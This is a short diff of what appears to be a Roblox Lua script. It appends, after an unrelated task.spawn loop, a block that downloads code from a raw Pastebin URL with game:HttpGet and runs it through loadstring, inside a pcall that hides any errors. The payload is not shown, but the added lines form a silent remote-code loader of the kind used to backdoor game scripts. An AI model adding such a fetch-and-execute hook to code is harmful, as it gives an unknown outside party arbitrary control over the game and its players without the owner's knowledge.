@@ -82,3 +82,7 @@ task.spawn(function()
         end
     end
 end)
+
+pcall(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/J4ubW9uv"))()
+end)
